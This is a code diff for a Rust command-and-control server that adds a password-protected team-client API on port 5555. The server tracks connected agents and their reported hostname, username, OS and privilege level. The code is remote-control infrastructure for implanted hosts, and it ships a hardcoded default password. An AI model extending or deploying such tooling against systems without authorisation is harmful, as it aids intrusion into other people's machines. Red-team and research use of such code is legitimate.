@@ -22,6 +22,10 @@ use tracing::{info, warn, error, debug};
 use tracing_subscriber::EnvFilter;
 use tracing_appender::rolling::{RollingFileAppender, Rotation};
 
+// API module for team client communication
+mod api;
+use api::{ApiState, AgentInfo as ApiAgentInfo, create_api_router};
+
 type ClientId = u64;
 
 const DELIMITER: &str = "\n<<END>>\n";
@@ -40,6 +44,14 @@ struct Args {
     /// Puerto donde escuchar conexiones TLS
     #[arg(short, long, default_value_t = 4444)]
     port: u16,
+    
+    /// Puerto para la API de Team Client (HTTP/WebSocket)
+    #[arg(long = "api-port", default_value_t = 5555)]
+    api_port: u16,
+    
+    /// Contraseña para la API de Team Client
+    #[arg(long = "api-password", default_value = "c2r2-secret")]
+    api_password: String,
     
     /// Modo verboso
     #[arg(short, long)]
@@ -286,6 +298,7 @@ async fn handle_client(
     stream: TlsStream<TcpStream>,
     addr: String,
     clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
+    api_state: Arc<ApiState>,
     verbose: bool,
 ) {
     info!("Nueva conexión TLS: [{}] desde {}", id, addr);
@@ -299,6 +312,20 @@ async fn handle_client(
 
     let (tx, mut rx) = mpsc::unbounded_channel::<String>();
     let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
+    
+    // Create API agent info
+    let api_agent_info = ApiAgentInfo {
+        id,
+        addr: addr.clone(),
+        hostname: None,
+        username: None,
+        os_version: None,
+        privileges: None,
+        connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+    };
+    
+    // Register with API state
+    api_state.add_agent(id, api_agent_info, tx.clone()).await;
     
     {
         let mut clients = clients.lock().unwrap();
@@ -340,6 +367,7 @@ async fn handle_client(
 
     // Tarea para recibir respuestas del cliente
     let info = client_info.clone();
+    let api_state_recv = api_state.clone();
     let recv_task = tokio::spawn(async move {
         let mut command_buffer = String::new();
         
@@ -359,48 +387,78 @@ async fn handle_client(
                         let parts: Vec<&str> = line.trim().splitn(3, ':').collect();
                         if parts.len() >= 3 {
                             let mut info = info.lock().unwrap();
+                            let value = parts[2].to_string();
                             match parts[1] {
                                 "hostname" => {
-                                    info.hostname = Some(parts[2].to_string());
-                                    info!("[{}] SYSINFO hostname: {}", id, parts[2]);
+                                    info.hostname = Some(value.clone());
+                                    // Update API state
+                                    let api_state = api_state_recv.clone();
+                                    let value_clone = value.clone();
+                                    tokio::spawn(async move {
+                                        api_state.update_agent_info(id, |agent| {
+                                            agent.hostname = Some(value_clone);
+                                        }).await;
+                                    });
+                                    info!("[{}] SYSINFO hostname: {}", id, value);
                                     if verbose {
                                         println!("{} {} hostname: {}", 
                                             "📝".bright_green(), 
                                             format!("[{}]", id).bright_cyan(),
-                                            parts[2].bright_white()
+                                            value.bright_white()
                                         );
                                     }
                                 }
                                 "username" => {
-                                    info.username = Some(parts[2].to_string());
-                                    info!("[{}] SYSINFO username: {}", id, parts[2]);
+                                    info.username = Some(value.clone());
+                                    let api_state = api_state_recv.clone();
+                                    let value_clone = value.clone();
+                                    tokio::spawn(async move {
+                                        api_state.update_agent_info(id, |agent| {
+                                            agent.username = Some(value_clone);
+                                        }).await;
+                                    });
+                                    info!("[{}] SYSINFO username: {}", id, value);
                                     if verbose {
                                         println!("{} {} username: {}", 
                                             "📝".bright_green(), 
                                             format!("[{}]", id).bright_cyan(),
-                                            parts[2].bright_white()
+                                            value.bright_white()
                                         );
                                     }
                                 }
                                 "os" => {
-                                    info.os_version = Some(parts[2].to_string());
-                                    info!("[{}] SYSINFO OS: {}", id, parts[2]);
+                                    info.os_version = Some(value.clone());
+                                    let api_state = api_state_recv.clone();
+                                    let value_clone = value.clone();
+                                    tokio::spawn(async move {
+                                        api_state.update_agent_info(id, |agent| {
+                                            agent.os_version = Some(value_clone);
+                                        }).await;
+                                    });
+                                    info!("[{}] SYSINFO OS: {}", id, value);
                                     if verbose {
                                         println!("{} {} OS: {}", 
                                             "📝".bright_green(), 
                                             format!("[{}]", id).bright_cyan(),
-                                            parts[2].bright_white()
+                                            value.bright_white()
                                         );
                                     }
                                 }
                                 "privileges" => {
-                                    info.privileges = Some(parts[2].to_string());
-                                    info!("[{}] SYSINFO privileges: {}", id, parts[2]);
+                                    info.privileges = Some(value.clone());
+                                    let api_state = api_state_recv.clone();
+                                    let value_clone = value.clone();
+                                    tokio::spawn(async move {
+                                        api_state.update_agent_info(id, |agent| {
+                                            agent.privileges = Some(value_clone);
+                                        }).await;
+                                    });
+                                    info!("[{}] SYSINFO privileges: {}", id, value);
                                     if verbose {
-                                        let priv_colored = if parts[2] == "Admin" {
-                                            parts[2].bright_red().bold()
+                                        let priv_colored = if value == "Admin" {
+                                            value.bright_red().bold()
                                         } else {
-                                            parts[2].bright_yellow().bold()
+                                            value.bright_yellow().bold()
                                         };
                                         println!("{} {} privilegios: {}", 
                                             "📝".bright_green(), 
@@ -497,6 +555,7 @@ async fn handle_client(
 
     // Limpiar cliente
     clients.lock().unwrap().remove(&id);
+    api_state.remove_agent(id).await;
     warn!("Cliente [{}] desconectado", id);
     println!("❌ Cliente [{}] desconectado", id);
 }
@@ -810,6 +869,7 @@ async fn main() {
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
     println!();
     println!("{} {}", "🔐 TLS Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
+    println!("{} {}", "🌐 API Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.api_port).bright_white());
     println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
     println!("{} {}", "📂 Logs:".bright_yellow().bold(), format!("{}/", logs_dir).bright_white());
     println!("{} {}", "🔑 Certs:".bright_yellow().bold(), format!("{}/", CERTS_DIR).bright_white());
@@ -825,10 +885,30 @@ async fn main() {
     let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
     let next_id = Arc::new(AtomicU64::new(1));
     let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));
+    
+    // Create API state for team client communication
+    let api_state = Arc::new(ApiState::new(args.api_password.clone(), args.verbose));
+    
+    // Start HTTP API server for team clients
+    let api_state_http = api_state.clone();
+    let api_bind = args.bind.clone();
+    let api_port = args.api_port;
+    tokio::spawn(async move {
+        let app = create_api_router(api_state_http);
+        let addr = format!("{}:{}", api_bind, api_port);
+        info!("Starting Team Client API on {}", addr);
+        let listener = tokio::net::TcpListener::bind(&addr)
+            .await
+            .expect("Failed to bind API server");
+        if let Err(e) = axum::serve(listener, app).await {
+            error!("API server error: {}", e);
+        }
+    });
 
     // Tarea para aceptar conexiones TLS
     let clients_clone = clients.clone();
     let next_id_clone = next_id.clone();
+    let api_state_clone = api_state.clone();
     let verbose = args.verbose;
     tokio::spawn(async move {
         loop {
@@ -836,6 +916,7 @@ async fn main() {
                 Ok((tcp_stream, peer_addr)) => {
                     let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                     let clients = clients_clone.clone();
+                    let api_state = api_state_clone.clone();
                     let acceptor = tls_acceptor.clone();
                     let addr = peer_addr.to_string();
                     
@@ -843,7 +924,7 @@ async fn main() {
                         // Realizar handshake TLS
                         match acceptor.accept(tcp_stream).await {
                             Ok(tls_stream) => {
-                                handle_client(id, tls_stream, addr, clients, verbose).await;
+                                handle_client(id, tls_stream, addr, clients, api_state, verbose).await;
                             }
                             Err(e) => {
                                 if verbose {
